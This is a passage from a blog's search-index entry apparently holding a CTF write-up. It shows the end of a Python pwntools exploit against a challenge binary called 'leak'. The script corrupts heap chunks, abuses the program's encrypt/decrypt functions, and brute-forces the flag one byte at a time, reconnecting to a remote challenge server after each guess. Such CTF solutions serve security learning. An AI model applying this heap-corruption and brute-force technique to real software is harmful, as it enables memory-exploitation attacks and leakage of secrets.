class="built_in">str</span>(Enc))</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(Text))</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(Password))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">Text,Password</span>):</span><br><span class="line">    sla(_cmd,<span class="built_in">str</span>(Dec))</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(Text))</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(Password))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="type">Dict</span> = [<span class="string">b&quot;\x00&quot;</span>,<span class="string">b&quot;&#123;&quot;</span>,<span class="string">b&quot;&#125;&quot;</span>,<span class="string">b&quot;1&quot;</span>,<span class="string">b&quot;2&quot;</span>,<span class="string">b&quot;3&quot;</span>,<span class="string">b&quot;4&quot;</span>,<span class="string">b&quot;5&quot;</span>,<span class="string">b&quot;6&quot;</span>,<span class="string">b&quot;7&quot;</span>,<span class="string">b&quot;8&quot;</span>,<span class="string">b&quot;9&quot;</span>,<span class="string">b&quot;0&quot;</span>,<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;b&quot;</span>,<span class="string">b&quot;c&quot;</span>,<span class="string">b&quot;d&quot;</span>,<span class="string">b&quot;e&quot;</span>,<span class="string">b&quot;f&quot;</span>,<span class="string">b&quot;-&quot;</span>,<span class="string">b&quot;g&quot;</span>,<span class="string">b&quot;l&quot;</span>]</span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">total = <span class="number">0x30</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">ii = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(cnt &lt; total):</span><br><span class="line">    <span class="keyword">if</span>(ii == <span class="built_in">len</span>(<span class="type">Dict</span>)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    ch = <span class="type">Dict</span>[ii]</span><br><span class="line">    payload = ch + flag </span><br><span class="line">    payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+payload.rjust(total,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">        add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">        add(<span class="number">4</span>,<span class="number">0x40</span>)</span><br><span class="line">        add(<span class="number">10</span>,<span class="number">0x40</span>)</span><br><span class="line">        edit(<span class="number">10</span>,payload)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        edit(<span class="number">1</span>,p8(<span class="number">0x50</span>))</span><br><span class="line">        add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">        add(<span class="number">3</span>,<span class="number">0x40</span>)</span><br><span class="line">        edit(<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>*(total-<span class="built_in">len</span>(flag)-<span class="number">1</span>+<span class="number">0x10</span>))</span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        <span class="comment">#dbg()</span></span><br><span class="line">        enc(<span class="number">2</span>,<span class="number">3</span>) </span><br><span class="line">        dec(<span class="number">2</span>,<span class="number">10</span>)</span><br><span class="line">        add(<span class="number">5</span>,<span class="number">0x40</span>)</span><br><span class="line">        add(<span class="number">6</span>,<span class="number">0x40</span>)</span><br><span class="line">        </span><br><span class="line">        ret = rc()</span><br><span class="line">        <span class="built_in">print</span>(ret)</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">            ii = ii +<span class="number">1</span> </span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> local:</span><br><span class="line">                p = process(argv=[<span class="string">&quot;./leak&quot;</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = remote(<span class="string">&quot;47.95.3.91&quot;</span>,<span class="number">33114</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ii = <span class="number">0</span></span><br><span class="line">            flag = ch + flag</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="built_in">print</span>(total-<span class="built_in">len</span>(flag))</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">            sl(<span class="built_in">str</span>(Delete))</span><br><span class="line">            sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">            delete(<span class="number">5</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> local:</span><br><span class="line">                p = process(argv=[<span class="string">&quot;./leak&quot;</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = remote(<span class="string">&quot;47.95.3.91&quot;</span>,<span class="number">33114</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        ii = ii + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">                p = process(argv=[<span class="string">&quot;./leak&quot;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                p = remote(<span class="string">&quot;47.95.3.91&quot;</span>,<span class="number">33114</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
        <tag>爆破</tag>
      </tags>
  </entry>
</search>
